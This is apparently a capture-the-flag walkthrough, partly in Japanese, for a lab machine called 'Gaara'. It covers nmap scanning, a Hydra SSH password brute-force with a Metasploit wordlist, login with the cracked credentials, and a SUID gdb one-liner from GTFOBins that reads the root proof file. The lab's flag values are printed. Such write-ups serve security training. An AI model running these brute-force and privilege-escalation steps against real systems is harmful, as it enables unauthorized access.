# Gaara

nmap scan results.

```bash
$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.169.142 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
$ echo $ports
22,80,24943
```

```bash
$ nmap -p$ports -sV -A 192.168.169.142
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 19:42 JST
Nmap scan report for 192.168.169.142
Host is up (0.27s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp    open   http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gaara
24943/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
```

## 80 TCP

一枚の画像のみのページだった．

![gaara](/home/funa/Downloads/gaara.jpg)

左下にはメールアドレスが載っている．

dyuuwijaya@yahoo.com

## SSH - 22TCP

SSH に対してブルートフォース攻撃をする．

ユーザ名の候補は

- dyuuwijaya
- Gaara
- gaara

パスワードリストは `/usr/share/wordlists/metasploit/unix_passwords.txt` を使う．

```bash
$ hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.169.142 ssh -V -t 24
<snip>
[ATTEMPT] target 192.168.169.142 - login "gaara" - pass "mariposa" - 2221 of 3049 [child 7] (0/22)
[ATTEMPT] target 192.168.169.142 - login "gaara" - pass "maria" - 2222 of 3049 [child 12] (0/22)
[ATTEMPT] target 192.168.169.142 - login "gaara" - pass "gabriela" - 2223 of 3049 [child 0] (0/22)
[ATTEMPT] target 192.168.169.142 - login "gaara" - pass "iloveyou2" - 2224 of 3049 [child 10] (0/22)
[22][ssh] host: 192.168.169.142   login: gaara   password: iloveyou2
```

`gaara:iloveyou2` が認証情報だということがわかった．

SSH 接続してみる．

```bash
$ ssh gaara@192.168.169.142
gaara@192.168.169.142's password:
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ ls
flag.txt  local.txt
gaara@Gaara:~$ cat flag.txt
Your flag is in another file...
gaara@Gaara:~$ cat local.txt
ff0dd83fa649d01c77d54304aadadc8b
```

user flag を見つけることができた．

SUID binaries を探す．

```bash
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

[GTFOBins](https://gtfobins.github.io/gtfobins/gdb/) より `/usr/bin/gdb` が権限昇格に使えそう．

```bash
gaara@Gaara:~$ gdb -nx -ex 'python print(open("/root/proof.txt").read())' -ex quit                                     
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
3a4c2d54f7ac9fac4dfd4d3137ee881c
```

Conglaturations!